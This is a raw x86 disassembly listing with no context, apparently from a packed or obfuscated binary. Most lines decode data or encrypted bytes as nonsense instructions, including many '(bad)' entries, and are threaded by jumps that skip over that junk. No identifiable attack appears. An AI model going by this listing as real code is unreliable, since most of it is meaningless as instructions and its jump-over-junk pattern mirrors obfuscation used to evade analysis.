  4072a5:	int    0xd8
  4072a7:	and    al,0x77
  4072a9:	and    ecx,ebp
  4072ab:	inc    edi
  4072ac:	and    DWORD PTR ds:0x6df1f0ee,esp
  4072b2:	ja     0x407250
  4072b4:	push   edx
  4072b5:	cs and esi,edi
  4072b8:	adc    DWORD PTR [edx-0x765b0e03],0xa801f7ed
  4072c2:	adc    BYTE PTR [edi],dl
  4072c4:	mov    edi,0xa9a82533
  4072c9:	lods   eax,DWORD PTR ds:[esi]
  4072ca:	hlt    
  4072cb:	push   ecx
  4072cc:	sub    DWORD PTR [esi-0xb],esp
  4072cf:	xchg   esi,eax
  4072d0:	je     0x4072c6
  4072d2:	mul    ecx
  4072d4:	rol    BYTE PTR [ebp+0x8281d4d],0x43
  4072db:	pop    eax
  4072dc:	in     eax,dx
  4072dd:	adc    al,0x30
  4072df:	fld    TBYTE PTR [edi+0x4204dbef]
  4072e5:	(bad)  
  4072e6:	fdivp  st(7),st
  4072e8:	mov    ss,WORD PTR [esi-0x56]
  4072eb:	imul   BYTE PTR [esi-0x78c8115c]
  4072f1:	aam    0x19
  4072f3:	popf   
  4072f4:	or     DWORD PTR [eax-0x44211da1],ebp
  4072fa:	mov    edi,0x71f3f99c
  4072ff:	or     eax,0x700f75ae
  407304:	in     eax,0xb1
  407306:	jl     0x40737d
  407308:	lods   al,BYTE PTR ds:[esi]
  407309:	test   eax,0x42a40890
  40730e:	lds    esi,FWORD PTR [edx+0x6082e062]
  407314:	ror    BYTE PTR [ebx-0x1e7e07bb],0xef
  40731b:	add    BYTE PTR [bx+si],al
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x4306c6
  40732a:	sub    DWORD PTR ds:0x43061a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e8e2,0x43062a
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x430636,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0x3efddca4]
  40736c:	mov    dh,0xfa
  40736e:	aaa    
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x4073cd
  407378:	pusha  
  407379:	dec    esi
  40737a:	pop    ecx
  40737b:	(bad)  
  40737c:	push   ebp
  40737d:	sbb    BYTE PTR [ebx],0xf2
  407380:	jmp    0x407353
  407382:	push   cs
  407383:	rol    DWORD PTR [esi-0xa685c06],cl
  407389:	jl     0x407319
  40738b:	rcr    DWORD PTR [esi+0x31f7635c],cl
  407391:	sbb    dh,BYTE PTR [ecx+0x7494f1f4]
  407397:	outs   dx,DWORD PTR ds:[esi]
  407398:	mov    eax,ds:0x75087162
  40739d:	inc    edx
  40739e:	lahf   
  40739f:	mov    ecx,esp
  4073a1:	scas   al,BYTE PTR es:[edi]
  4073a2:	or     BYTE PTR [eax+0x553bedfc],0x47
  4073a9:	inc    esi
  4073aa:	or     al,0x42
  4073ac:	xchg   edx,eax
  4073ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ae:	sbb    BYTE PTR [ecx],0x8d
  4073b1:	dec    esp
  4073b2:	outs   dx,DWORD PTR ds:[esi]
  4073b3:	ja     0x407346
  4073b5:	dec    eax
  4073b6:	push   edx
  4073b7:	ror    BYTE PTR [edx+0x3a],cl
  4073ba:	out    dx,al
  4073bb:	(bad)  
  4073bc:	hlt    
  4073bd:	dec    ecx
  4073be:	xor    al,0x88
  4073c0:	fnsave [edi-0x1b]
  4073c3:	adc    ah,al
  4073c5:	xor    bh,dh
  4073c7:	push   ds
  4073c8:	int3   
  4073c9:	fild   QWORD PTR [ebx]
  4073cb:	sub    bh,0x61
  4073ce:	imul   DWORD PTR [ebx]
  4073d0:	xor    eax,0x74b2a453
  4073d5:	sbb    eax,DWORD PTR [ecx+esi*8-0x58a19e0d]
  4073dc:	push   edi
  4073dd:	(bad)  
  4073de:	cmp    ecx,DWORD PTR [esp+ebx*8+0x5d1f6010]
  4073e5:	int3   
  4073e6:	mov    WORD PTR [ebx+edx*4-0x430013ae],ds
  4073ed:	daa    
  4073ee:	mov    ch,ch
  4073f0:	lods   al,BYTE PTR ds:[esi]
  4073f1:	dec    BYTE PTR [ebp+esi*4+0xf]
  4073f5:	idiv   DWORD PTR [eax]
  4073f7:	out    0x8e,al
  4073f9:	pop    ss
  4073fa:	les    esi,FWORD PTR [ebp+0x32]
  4073fd:	aas    
  4073fe:	mov    dh,0xb9
  407400:	sbb    al,0xbe
  407402:	mov    al,ds:0x90aeae13
  407407:	fnclex 
  407409:	sbb    al,0x81
  40740b:	cmp    al,BYTE PTR [edi]
  40740d:	mov    ebp,0xca32df26
  407412:	ja     0x4073c9
  407414:	(bad)  
  407415:	cdq    
  407416:	int    0x19
  407418:	inc    edi
  40741a:	jmp    DWORD PTR gs:[esi]
  40741d:	jbe    0x4073d3
  40741f:	fwait
  407420:	dec    ebp
  407421:	dec    edi
  407422:	sub    DWORD PTR [ecx],0xffffffbe
  407425:	loopne 0x407407
  407427:	ret    
  407428:	data16 adc ah,BYTE PTR [esi-0x50]
  40742c:	fsub   DWORD PTR [ebx+0x4d9ad919]
  407432:	sbb    al,BYTE PTR [eax]
  407434:	out    dx,eax
  407435:	jnp    0x4073f6
  407437:	fs or  al,0x64
  40743a:	dec    ecx
  40743b:	adc    dl,al
  40743d:	rol    BYTE PTR [ebx+0x7ba2b678],cl
  407443:	mov    ebx,DWORD PTR [ecx+esi*2]
  407446:	ja     0x407474
  407448:	clc    
  407449:	fild   DWORD PTR [edi]
  40744b:	sbb    eax,0x1268b76a
  407450:	adc    BYTE PTR [edx+0x309ddaf6],bh
  407456:	outs   dx,DWORD PTR ds:[esi]
  407457:	fldenv [edi+ebp*4-0x2e75032e]
  40745e:	idiv   DWORD PTR [ebx-0x38]
  407461:	rcl    al,1
  407463:	mov    bl,0x57
  407465:	dec    edx
  407466:	xlat   BYTE PTR ds:[ebx]
  407467:	aam    0xbb
  407469:	push   eax
  40746a:	xchg   ah,cl
  40746c:	fiadd  DWORD PTR [esp+ecx*1]
  40746f:	out    dx,eax
  407470:	mov    dh,BYTE PTR [esi+0x7394737a]
  407476:	adc    ch,ah
  407478:	xlat   BYTE PTR ds:[ebx]
  407479:	not    DWORD PTR [ebx+0x73]
  40747c:	mov    cl,0x29
  40747e:	aad    0x67
  407480:	cmp    bh,ch
  407482:	inc    ebp
  407483:	mov    edi,0x5bdfa864
  407488:	push   ss
  407489:	je     0x4074c1
  40748b:	inc    ebx
  40748c:	jbe    0x4074c6
  40748e:	xchg   ebx,eax
  40748f:	in     eax,dx
  407490:	mov    bl,0xbd
  407492:	arpl   WORD PTR [edi],cx
  407494:	sti    
  407495:	dec    edi
  407496:	iret   
  407497:	loope  0x4074f6
  407499:	loopne 0x40742a
  40749b:	or     DWORD PTR [esi],0x512a7c3
  4074a1:	push   esp
  4074a2:	add    DWORD PTR [ecx+0x45044e81],ebx
  4074a8:	pop    eax
  4074a9:	(bad)  
  4074aa:	pop    ss
  4074ab:	jne    0x407476
  4074ad:	mov    ebp,0x4bf7a0c0
  4074b2:	test   edx,eax
  4074b4:	mov    al,ds:0xa29d9683
  4074b9:	call   0xf8b3:0xb59a8164
  4074c0:	lods   al,BYTE PTR ds:[esi]
  4074c1:	int3   
  4074c2:	stos   DWORD PTR es:[edi],eax
  4074c3:	jge    0x40751f
  4074c5:	(bad)  
  4074c7:	xor    DWORD PTR [esi+0x6945b856],edi
  4074cd:	cli    
  4074ce:	bound  eax,QWORD PTR [edx-0x249543ac]
  4074d4:	jae    0x407475
  4074d6:	jecxz  0x4074e3
  4074d8:	bound  ebx,QWORD PTR [eax-0x2b]
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	jmp    0x7ec0:0xedd5951e
  407510:	jle    0x4074e4
  407512:	jg     0x407592
  407514:	jle    0x40756e
  407516:	lds    edx,FWORD PTR [ebx-0x1ca34eb6]
  40751c:	clc    
  40751d:	mov    ebx,0x3dd1e49c
  407522:	shl    BYTE PTR [ecx],1
  407524:	dec    edi
  407525:	fsubr  QWORD PTR [edi]
  407527:	mov    esi,0x188fe12c
  40752c:	mov    al,ds:0xbdc48568
  407531:	je     0x407551
  407533:	lock adc eax,0xc2c6021d
  407539:	xchg   esi,eax
  40753a:	outs   dx,BYTE PTR ds:[esi]
  40753b:	inc    eax
  40753c:	call   FWORD PTR [edi-0x15]
  40753f:	jo     0x4074f0
  407541:	or     dl,BYTE PTR [edi-0x1d]
  407544:	xchg   esp,eax
  407545:	dec    esi
  407546:	mov    bl,0x59
  407548:	mov    es,edx
  40754a:	sub    DWORD PTR [ecx],eax
  40754c:	je     0x40756d
  40754e:	mov    fs,WORD PTR [ecx-0x65]
  407551:	shr    BYTE PTR [ebx+ebx*8-0x47bfa404],0x60
  407559:	or     eax,0xc61a1e71
  40755e:	jge    0x40759c
  407560:	aaa    
  407561:	test   al,0xce
  407563:	outs   dx,BYTE PTR ds:[esi]
  407564:	popa   
  407565:	popa   
  407566:	pop    esp
  407567:	cmp    ch,dl
  407569:	pop    esi
  40756a:	mov    eax,0xb22feffb
  40756f:	dec    edx
  407570:	daa    
  407571:	ret    
  407572:	pushf  
  407573:	add    dh,BYTE PTR [esi]
  407575:	shl    DWORD PTR [ebx+0x7e],0xe0
  407579:	test   eax,0x9a6268e5
  40757e:	jle    0x4075c6
  407580:	nop
  407581:	push   ecx
  407582:	push   ds
  407583:	push   esp
  407584:	mov    edx,0x19edffda
  407589:	mov    WORD PTR [edx],cs
  40758b:	xchg   dh,dh
  40758d:	lahf   
  40758e:	iret   
  40758f:	in     al,0x1a
  407591:	sahf   
  407592:	jmp    0xb9a7:0xd29f77a
  407599:	cmp    DWORD PTR ds:0x28f3b1f0,ebp
  40759f:	mov    edx,0x550e9949
  4075a4:	xor    BYTE PTR [esi-0x23],ah
  4075a7:	push   es
  4075a8:	push   ebx
  4075a9:	mov    al,ds:0x916a090c
  4075ae:	fwait
  4075af:	arpl   WORD PTR [eax],cx
  4075b1:	hlt    
  4075b2:	(bad)  
  4075b3:	call   0x5d2ad937
  4075b8:	out    dx,al
  4075b9:	sbb    BYTE PTR [ebx],ah
  4075bb:	add    al,0x22
  4075bd:	not    BYTE PTR [eax+edx*1-0x64116bb9]
  4075c4:	cmp    bh,BYTE PTR [eax-0x11]
  4075c7:	mov    ah,0x66
  4075c9:	fst    DWORD PTR [ebx]
  4075cb:	in     al,0x7f
  4075cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075ce:	jmp    0xe25282e6
  4075d3:	jo     0x407575
  4075d5:	and    DWORD PTR [edi+0x3bafe592],ecx
  4075db:	dec    esi
  4075dc:	adc    esi,DWORD PTR [ecx-0x5e]
  4075df:	(bad)  
  4075e0:	pop    ebx
  4075e1:	inc    esp
  4075e2:	test   BYTE PTR [edx+esi*8],0x47
  4075e6:	aam    0xc0
  4075e8:	cmp    eax,0x897c95b8
  4075ed:	mov    BYTE PTR [eax-0x4bcb6f29],dh
  4075f3:	pop    edi
  4075f4:	repz add edi,DWORD PTR [ebx+0x54ab92ba]
  4075fb:	(bad)  
  4075fc:	sbb    ebp,eax
  4075fe:	jmp    0x4075c6
  407600:	dec    ecx
  407601:	fld    QWORD PTR [esi-0x6f]
  407604:	repnz pop ss
  407606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407607:	shl    DWORD PTR [ecx],cl
  407609:	adc    dh,al
  40760b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40760c:	das    
  40760d:	push   ecx
  40760e:	mov    ebx,0x9a369fc4
  407613:	pop    ss
  407614:	cld    
  407615:	adc    si,WORD PTR [ebx]
  407618:	mov    ah,0xd
  40761a:	ds jmp 0x6727:0xea87c3a9
  407622:	push   edi
  407623:	aad    0xc
  407625:	sbb    bh,al
  407627:	push   esp
  407628:	cld    
  407629:	cld    
  40762a:	inc    esi
  40762b:	adc    BYTE PTR [eax+0x47a05b27],ch
  407631:	fistp  QWORD PTR [edi+edi*2]
  407634:	and    al,0xb9
  407636:	(bad)  
  407637:	push   ecx
  407638:	repz arpl WORD PTR [ebp-0x31],bx
  40763c:	push   ss
  40763d:	mov    esi,0x70500c76
  407642:	sbb    BYTE PTR [edi*1-0x462c4ff6],ah
  407649:	dec    edi
  40764a:	sbb    edi,DWORD PTR [esi+0x5b]
  40764d:	and    esp,edx
  40764f:	ins    BYTE PTR es:[edi],dx
  407650:	mov    ebp,0xdf2155f8
  407655:	push   0xffffffb6
  407657:	add    dl,BYTE PTR [ebp+0xf]
  40765a:	adc    bh,BYTE PTR es:[ebx]
  40765d:	call   0xa91772d9
  407662:	loopne 0x407655
  407664:	scas   eax,DWORD PTR es:[edi]
  407665:	mov    ah,0x8e
  407667:	into   
  407668:	push   0x6e
  40766a:	pop    ecx
  40766b:	gs shl bh,1
  40766e:	lahf   
  40766f:	fldenv ds:0xbafec4fa
  407675:	cld    
  407676:	fsub   DWORD PTR [eax+0x87d8bea]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	mov    ds,WORD PTR [esi+eax*8-0x3a]
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x40764d
  40769a:	dec    ebp
  40769b:	mov    esi,0xe0b6222f
  4076a0:	sbb    cl,dh
  4076a2:	fidiv  WORD PTR [ebx+0x58]
  4076a5:	mov    bl,0x3b
  4076a7:	mov    dh,BYTE PTR [ebx+ebx*4+0x8836b9]
  4076ae:	outs   dx,DWORD PTR ds:[esi]
  4076af:	cs jg  0x4076d8
  4076b2:	jae    0x407659
  4076b4:	test   eax,0x2ae88c63
  4076b9:	sar    DWORD PTR [ebx+eax*4+0x439f69b],cl
  4076c0:	mov    cl,0xaf
  4076c2:	adc    BYTE PTR [ebp+0x2b0f238d],bl
  4076c8:	(bad)  
  4076c9:	jge    0x4076e8
  4076cb:	pop    ds
  4076cc:	push   es
  4076cd:	out    0xb0,al
  4076cf:	sub    al,0x21
  4076d1:	loop   0x4076f9
  4076d3:	out    0xc,eax
  4076d5:	cli    
  4076d6:	xchg   bl,ch
  4076d8:	pop    ds
  4076d9:	jmp    0xc2c0:0x512b653
  4076e0:	or     DWORD PTR [eax-0x447efd27],0x56e501cc
  4076ea:	in     al,0x92
  4076ec:	mov    esi,DWORD PTR [esi+edx*8-0x32c69a15]
  4076f3:	popa   
  4076f4:	icebp  
  4076f5:	jl     0x4076c1
  4076f7:	cmp    eax,ecx
  4076f9:	mov    edi,0x42294988
  4076fe:	pop    edi
  4076ff:	push   edx
  407700:	ins    BYTE PTR es:[edi],dx
  407701:	mov    ch,0x9f
  407703:	fucomip st,st(3)
  407705:	or     DWORD PTR [eax+0x3e930813],edx
  40770b:	nop
  40770c:	ja     0x407748
  40770e:	call   0x20c0f51e
  407713:	and    edx,DWORD PTR [ebx+edi*4+0x34ca068d]
  40771a:	ins    DWORD PTR es:[edi],dx
  40771b:	fcomp  QWORD PTR [ecx+0x3e77dfb9]
  407721:	inc    ecx
  407722:	xor    al,0xb6
  407725:	sbb    ch,0x9b
  407728:	mov    WORD PTR [ecx*8+0x1ce46b6a],gs
  40772f:	loope  0x4076bb
  407731:	dec    ecx
  407732:	cli    
  407733:	into   
  407734:	fisub  WORD PTR [eax+0x62f188ac]
  40773a:	jmp    0x8fb5d4e6
  40773f:	test   BYTE PTR [ebp-0x3465039b],0xcc
  407746:	daa    
  407747:	or     al,dl
  407749:	lods   al,BYTE PTR ds:[esi]
  40774a:	pop    es
  40774b:	push   eax
  40774c:	popf   
  40774d:	ss pop esp
  40774f:	lods   eax,DWORD PTR ds:[esi]
  407750:	mov    dh,0x7d
  407752:	xchg   ebp,eax
  407753:	loopne 0x40774d
  407755:	fstp   DWORD PTR [edi+0x42c0acef]
  40775b:	inc    esp
  40775c:	and    DWORD PTR [esi-0x33],esp
  40775f:	test   DWORD PTR [ebx-0x63],0xeb6f1903
  407766:	push   esi
  407767:	stos   DWORD PTR es:[edi],eax
  407768:	ins    BYTE PTR es:[edi],dx
  407769:	push   edi
  40776a:	mov    ebx,0xea0badab
  40776f:	sbb    esp,DWORD PTR [ecx]
  407771:	leave  
  407772:	add    eax,0x3d4c9091
  407777:	sbb    eax,0x7dbef737
  40777c:	lods   eax,DWORD PTR ds:[esi]
  40777d:	xchg   edi,eax
  40777e:	inc    esp
  40777f:	sti    
  407780:	ins    BYTE PTR es:[edi],dx
  407781:	(bad)  
  407782:	sti    
  407783:	jg     0x4077db
  407785:	cmp    esi,ebp
  407787:	cs clc 
  407789:	push   ecx
  40778a:	data16 cmp dl,BYTE PTR [ebp+0xf72b33d]
  407791:	outs   dx,DWORD PTR ds:[si]
  407793:	test   DWORD PTR [edx+0x7ad4e231],eax
  407799:	cdq    
  40779a:	mov    ds:0x93fe987,al
  40779f:	push   cs
  4077a0:	out    dx,eax
  4077a1:	xlat   BYTE PTR ds:[ebx]
  4077a2:	pop    ebp
  4077a3:	popf   
  4077a4:	cmp    ebp,DWORD PTR [edx]
  4077a6:	les    ecx,FWORD PTR [edi+0x1103c662]
  4077ac:	shl    cl,cl
  4077ae:	push   cs
  4077af:	dec    esp
  4077b0:	scas   eax,DWORD PTR es:[edi]
  4077b1:	dec    eax
  4077b2:	jno    0x40778e
  4077b4:	xor    DWORD PTR [ebx],ecx
  4077b6:	rcr    BYTE PTR [edx+eiz*1-0x4ae2e1bb],cl
  4077bd:	(bad)  
  4077be:	mov    dl,0x7f
  4077c0:	ret    0xa520
  4077c3:	pcmpgtb mm6,QWORD PTR [edi-0x7dc6c616]
  4077ca:	das    
  4077cb:	cmp    al,0xaa
  4077cd:	aad    0x3d
  4077cf:	push   ss
  4077d0:	inc    ecx
  4077d1:	mov    al,ds:0x826b9c95
  4077d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d7:	imul   ebx,DWORD PTR [ecx+ebx*2],0xc530e672
  4077de:	jp     0x407841
  4077e0:	sbb    eax,0xdc00d6aa
  4077e5:	int3   
  4077e6:	sti    
  4077e7:	mov    bl,0x24
  4077e9:	cmp    bl,dh
  4077eb:	dec    edi
  4077ec:	sub    BYTE PTR [eax],al
  4077ee:	aaa    
  4077ef:	pusha  
  4077f0:	call   0xad5c156d
  4077f5:	ja     0x4077f4
  4077f7:	add    bl,BYTE PTR [edx-0x2b25636d]
  4077fd:	mov    eax,0x8a40
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	mov    cl,0x89
  407822:	pop    edi
  407823:	xlat   BYTE PTR ds:[ebx]
  407824:	and    eax,0xd27e7ec3
  407829:	jg     0x4078a9
  40782b:	jle    0x40783c
  40782d:	sbb    BYTE PTR [ebp-0x74],ah
  407830:	inc    ecx
  407831:	mov    cl,0x97
  407833:	jo     0x407816
  407835:	(bad)  
  407836:	es in  eax,0x8d
  407839:	repnz in al,dx
  40783b:	shr    BYTE PTR [edi],1
  40783d:	push   edx
  40783e:	ss jle 0x407814
  407841:	sub    ebp,ebp
  407843:	jae    0x4077e8
  407845:	or     BYTE PTR [ecx],ch
  407847:	mov    ecx,0xa0eb3bd0
  40784c:	icebp  
  40784d:	pop    ebx
  40784e:	xor    esp,edi
  407850:	fldcw  WORD PTR ds:0x32b9b9f5
  407856:	mov    esi,0x8cb46f9c
  40785b:	enter  0x9ded,0x37
  40785f:	xor    bh,BYTE PTR [edi+ebp*2+0x7f]
  407863:	jl     0x40787f
  407865:	xor    edi,DWORD PTR [ebx]
  407867:	adc    eax,0x869e8ada
  40786c:	add    DWORD PTR [ecx-0x7febf308],esi
  407872:	push   eax
  407873:	dec    ebx
  407874:	mov    bl,0x27
  407876:	add    BYTE PTR [eax-0x70],bh
  407879:	lds    ecx,FWORD PTR [eax-0x6c]
  40787c:	loopne 0x4078ea
  40787e:	call   0x1dbf:0xca26b07a
  407885:	sbb    ecx,DWORD PTR [esi]
  407887:	call   0x2315:0x8e92707a
  40788e:	cli    
  40788f:	inc    edi
  407890:	imul   esi,edi,0xffffffa4
  407893:	es xchg ebp,eax
  407895:	mov    esi,0x116b2fd0
  40789a:	and    DWORD PTR [ebx],esp
  40789c:	sub    ecx,DWORD PTR [eax-0x4]
  40789f:	xor    DWORD PTR [ebx],0xffffffc7
  4078a2:	les    esp,FWORD PTR [ebx+eax*8-0x4f17cce]
  4078a9:	inc    edx
  4078aa:	add    ebx,DWORD PTR [ebx]
  4078ac:	jb     0x407924
  4078ae:	sbb    al,0xdb
  4078b0:	mov    ebp,0x3d5de039
  4078b5:	cmp    BYTE PTR [ecx],ah
  4078b7:	mov    al,0x56
  4078b9:	outs   dx,DWORD PTR ds:[esi]
  4078ba:	std    
  4078bb:	mov    cl,0xfa
  4078bd:	mov    ebx,0x371fcc32
  4078c2:	mov    ds:0x4cb472f,eax
  4078c7:	and    eax,0x5460e50d
  4078cc:	mov    WORD PTR [ebp-0x30dc0370],?
  4078d2:	mov    edx,0x49ed43f6
  4078d7:	xchg   edx,esp
  4078d9:	xchg   bx,ax
  4078db:	add    cl,BYTE PTR [ecx-0x12269dcc]
  4078e1:	clc    
  4078e2:	jp     0x4078d6
  4078e4:	sar    DWORD PTR [edx],cl
  4078e6:	leave  
  4078e7:	add    ebp,DWORD PTR [ecx+0x19]
  4078ea:	test   al,0x9b
  4078ec:	xchg   ecx,eax
  4078ed:	lds    eax,FWORD PTR [esi-0x1a]
  4078f0:	in     al,0x34
  4078f2:	add    eax,0x5760cb9e
  4078f7:	push   edx
  4078f8:	and    al,0xb0
  4078fa:	add    esi,DWORD PTR [ebp+0x7f089a9b]
  407900:	sahf   
  407901:	bts    DWORD PTR [esi-0x7b],0x66
  407906:	mov    WORD PTR [edx+0x1314f9ba],cs
  40790c:	xchg   edi,eax
  40790d:	or     BYTE PTR [ebx+eiz*1-0x5d],0xb0
  407912:	xchg   DWORD PTR es:[edi-0x76],eax
  407916:	push   eax
  407917:	popa   
  407918:	loopne 0x407921
  40791a:	dec    ebx
  40791b:	sar    DWORD PTR [edx-0x27],cl
  40791e:	cmp    DWORD PTR [eax+0x583522e2],ebp
  407924:	push   edx
  407925:	inc    esp
  407926:	jnp    0x407917
  407928:	lods   eax,DWORD PTR ds:[esi]
  407929:	jge    0x4078e6
  40792b:	out    dx,al
  40792c:	jnp    0x407966
  40792e:	ins    BYTE PTR es:[edi],dx
  40792f:	cmp    eax,0x83c0e425
  407934:	dec    ecx
  407935:	add    eax,0x6492dfaf
  40793a:	(bad)  
  40793b:	cmp    esp,DWORD PTR [ecx-0x523e0021]
  407941:	out    dx,al
  407942:	jecxz  0x407936
  407944:	mov    edx,0xf3eebac
  407949:	dec    ecx
  40794a:	aam    0x14
  40794c:	shl    BYTE PTR [ebx-0x465ffbbb],0x3d
  407953:	scas   al,BYTE PTR es:[edi]
  407954:	int3   
  407955:	dec    ebx
  407956:	stc    
  407957:	sbb    al,0x15
  407959:	cmp    cl,BYTE PTR [esi]
  40795b:	and    bl,ah
  40795d:	cmp    cl,BYTE PTR [esi+0x1dc9555f]
  407963:	cmp    eax,ebx
  407965:	mov    bl,0xc2
  407967:	jno    0x407942
  407969:	test   al,0xb9
  40796b:	cdq    
  40796c:	mov    cl,0xb5
  40796e:	pop    eax
  40796f:	jns    0x407924
  407971:	push   esp
  407972:	xchg   ebp,eax
  407973:	xor    bh,BYTE PTR ds:0xba69356b
  407979:	dec    ecx
  40797a:	jns    0x4079dc
  40797c:	cs inc esp
  40797e:	adc    ah,BYTE PTR [esi+0x3b6a5eba]
  407984:	cmp    esp,DWORD PTR [esi+ebx*8+0x66]
  407988:	inc    ebp
  407989:	(bad)  
  40798a:	fnsave [ecx]
  40798c:	iret   
  40798d:	fidiv  WORD PTR [edx-0x1a]
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	loope  0x40795f
  4079a9:	nop
  4079aa:	mov    DWORD PTR [ecx-0x2d81813c],ebx
  4079b0:	jg     0x407a30
  4079b2:	jle    0x407972
  4079b4:	sub    ah,dl
  4079b6:	pop    ds
  4079b7:	mov    eax,0x25054876
  4079bc:	arpl   bp,dx
  4079be:	or     DWORD PTR [ecx+0x5276a475],ecx
  4079c4:	pop    edx
  4079c5:	fyl2x  
  4079c7:	(bad)  
  4079c8:	into   
  4079c9:	gs jnp 0x407989
  4079cc:	(bad)  
  4079ce:	mov    ebx,0x3b71725d
  4079d3:	out    dx,al
  4079d4:	inc    ebp
  4079d5:	ret    
  4079d6:	cmp    eax,0xcc5ecb9
  4079db:	mov    esp,0x5dc0bf6e
  4079e0:	dec    DWORD PTR [esi+0x5]
  4079e3:	jmp    0x19614ed2
  4079e8:	pop    eax
  4079e9:	dec    ecx
  4079ea:	ins    BYTE PTR es:[edi],dx
  4079eb:	xchg   ecx,eax
  4079ec:	dec    ebp
  4079ed:	adc    DWORD PTR [ebx+0x29],ebx
  4079f0:	mov    ds:0xc7a0a6e4,eax
  4079f5:	xchg   esi,eax
  4079f6:	mov    ecx,0xa96c21e8
  4079fb:	mov    al,ds:0x7ad9db5f
  407a00:	gs inc ebp
  407a02:	fs je  0x407a71
  407a05:	jmp    0x407a0c
  407a07:	dec    eax
  407a08:	pop    es
  407a09:	pop    es
  407a0a:	rcl    bh,1
  407a0c:	push   ss
  407a0d:	mov    WORD PTR [eax],cs
  407a0f:	idiv   BYTE PTR [ecx-0x7f5da9b4]
  407a15:	les    edx,FWORD PTR [edx+0x5739ccda]
  407a1b:	mov    ds,WORD PTR [ebp-0x6e]
  407a1e:	adc    eax,0x2c9b343d
  407a23:	jno    0x4079ad
  407a25:	sbb    bh,BYTE PTR [edx+0x454e0745]
  407a2b:	adc    ecx,DWORD PTR [edx]
  407a2d:	nop
  407a2e:	sub    al,0xbf
  407a30:	in     eax,dx
  407a31:	stc    
  407a32:	add    esp,DWORD PTR [ebx-0x71]
  407a35:	aam    0x31
  407a37:	and    dl,dh
  407a39:	or     DWORD PTR [ecx-0x26],edi
  407a3c:	ret    
  407a3d:	inc    ecx
  407a3e:	in     eax,dx
  407a3f:	add    BYTE PTR [ebp+edx*1+0x69],cl
  407a43:	pusha  
  407a44:	sub    al,0xd4
  407a46:	sbb    al,0x11
  407a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a49:	sbb    DWORD PTR [edi],ebx
  407a4b:	pop    ds
  407a4c:	call   0xc981:0x63fe0300
  407a53:	cmp    eax,0xa22c1f3e
  407a58:	adc    DWORD PTR [edi+0x31],edi
  407a5b:	xlat   BYTE PTR ds:[ebx]
  407a5c:	pop    esi
  407a5d:	dec    edx
  407a5e:	or     BYTE PTR [esi-0x1b559919],0xec
  407a65:	aaa    
  407a66:	mov    ecx,0xc13dcf98
  407a6b:	rcl    edx,1
  407a6d:	cmp    cl,BYTE PTR [ebp-0x1d]
  407a70:	mov    cl,0x61
  407a72:	outs   dx,DWORD PTR ds:[esi]
  407a73:	repz mov esi,0xf638eb0d
  407a79:	sbb    al,0xc1
  407a7b:	mov    ecx,DWORD PTR ds:0x9e52bd50
  407a81:	stos   DWORD PTR es:[edi],eax
  407a82:	loopne 0x407a59
  407a84:	ss out dx,al
  407a86:	mul    BYTE PTR [esi-0x77]
  407a89:	or     eax,0x6a599fb1
  407a8e:	xchg   esp,eax
  407a8f:	cwde   
  407a90:	repz fiadd DWORD PTR [ecx+0x58]
  407a94:	rcr    BYTE PTR [edx+0x428217a4],0xb3
  407a9b:	push   cs
  407a9c:	add    DWORD PTR [edx-0x759b13ec],edi
  407aa2:	in     eax,0xd5
  407aa4:	inc    eax
  407aa5:	mov    esp,0x878dd806
  407aaa:	dec    ebp
  407aab:	mov    eax,ds:0xeff3b142
  407ab0:	jmp    0xac97:0x8c906cd1
  407ab7:	dec    edx
  407ab8:	jns    0x407b16
  407aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407abb:	in     al,0xd4
  407abd:	mov    BYTE PTR ds:0xd90aba34,al
  407ac3:	sub    al,0x5d
  407ac5:	inc    ebx
  407ac6:	aaa    
  407ac7:	pop    ecx
  407ac8:	sahf   
